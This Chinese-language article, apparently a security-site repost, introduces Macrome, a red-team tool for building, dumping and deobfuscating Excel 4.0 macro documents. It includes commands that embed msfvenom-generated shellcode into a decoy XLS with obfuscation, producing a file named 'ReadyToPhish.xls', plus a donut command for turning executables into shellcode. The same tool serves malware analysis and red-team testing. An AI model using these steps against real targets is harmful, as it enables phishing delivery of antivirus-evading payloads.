![](https://image.3001.net/images/20220303/1646321259_6220de6be7e7d7ee483d5.png!small)

## 关于Macrome

Macrome是一款功能强大的Excel宏文档读取和编写工具，该工具专为红队研究人员和安全分析人员设计。

## 工具安装/构建

首先，我们需要使用下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/michaelweber/Macrome.git

接下来，我们就可以使用下列命令构建项目了：

    
    
    dotnet run -- build --decoy-document Docs\decoy_document.xls --payload Docs\popcalc.bin

或者：

    
    
    dotnet build
    
    cd bin/Debug/netcoreapp2.0
    
    dotnet Macrome.dll deobfuscate --path obfuscated_document.xls

需要注意的是，在进行代码构建时，我们需要在本地环境中安装并配置好dotnet 5.0+。【[
_下载地址_](https://dotnet.microsoft.com/download/dotnet/5.0)】

不过，该工具的发布版本并不需要dotnet，我们可以直接访问该项目的【[
_Releases页面_](https://github.com/michaelweber/Macrome/releases)】下载Windows、macOS或Linux系统的工具版本。

## 工具使用

我们可以直接在解决方案目录中运行“dotnet run”，或使用“dotnet”运行构建的Macrome代码。

Macrome主要有三种操作模式，即构建模式、导出模式和反混淆模式。

### 构建模式

    
    
    Macrome build --decoy-document decoy_document.xls --payload beacon.bin --payload64-bit beacon64.bin --payload-method Base64 --method ArgumentSubroutines --password VelvetSweatshop --preamble preamble.txt --output-file-name ReadyToPhish.xls

 **使用Payload**

我们可以生成一个Shellcode Payload，并将其提供给工具运行。这里可以使用下列参数，并通过msfvenom来生成Payload：

    
    
    msfvenom -a x86 -b '\x00' --platform windows -p windows/exec cmd=calc.exe -e x86/alpha_mixed -f raw EXITFUNC=thread > popcalc.bin

工具还支持64位Payload，我们可以使用下列命令生成一个名为“popcalc64.bin”的64位Payload：

    
    
    msfvenom -a x64 -b '\x00' --platform windows -p windows/x64/exec cmd=calc.exe -e x64/xor -f raw EXITFUNC=thread > popcalc64.bin

这个Payload可以通过下列命令嵌入到宏文件中：

    
    
    dotnet Macrome.dll build --decoy-document decoy_document.xls --payload popcalc.bin --payload64-bit popcalc64.bin

嵌入到可执行文件中：

    
    
    donut.exe -a 3 -b 1 -z 1 executableToEmbed.exe

 **宏Payload使用**

    
    
    dotnet Macrome.dll build --decoy-document decoy_document.xls --payload macro-example.txt --payload-type Macro

### 导出模式

导出命令需要提供一个只想目标文件的路径“path”参数：

    
    
    dotnet Macrome.dll dump --path docToDump.xls

### 反混淆模式

比如说，如果想要对一个XLS 2003宏文件（路径为path/to/obfuscated_file.xls）进行反混淆处理的话，可以直接运行下列命令：

    
    
    dotnet Macrome.dll deobfuscate --path path/to/obfuscated_file.xls

该命令将会生成一个混淆文件副本，并允许我们进行额外的分析和处理。

## 项目地址

 **Macrome：** 【[ _GitHub传送门_](https://github.com/michaelweber/Macrome)】

## 参考资料

> [ _https://malware.pizza/2020/05/12/evading-av-with-excel-macros-and-> biff8-xls/_](https://malware.pizza/2020/05/12/evading-av-with-excel-macros-> and-biff8-xls/)
>
> [ _https://malware.pizza/2020/06/18/further-evasion-in-the-forgotten-> corners-of-ms-xls/_](https://malware.pizza/2020/06/18/further-evasion-in-> the-forgotten-corners-of-ms-xls/)
>
> [ _https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-> xlm/_](https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-> xlm/)
>
> [ _https://inquest.net/blog/2019/01/29/Carving-Sneaky-XLM-> Files_](https://inquest.net/blog/2019/01/29/Carving-Sneaky-XLM-Files)
>
> [ _https://inquest.net/blog/2020/03/18/Getting-Sneakier-Hidden-Sheets-Data-> Connections-and-XLM-Macros_](https://inquest.net/blog/2020/03/18/Getting-> Sneakier-Hidden-Sheets-Data-Connections-and-XLM-Macros)
>
> [
> _https://inquest.net/blog/2020/05/06/ZLoader-4.0-Macrosheets-_](https://inquest.net/blog/2020/05/06/ZLoader-4.0-Macrosheets-)

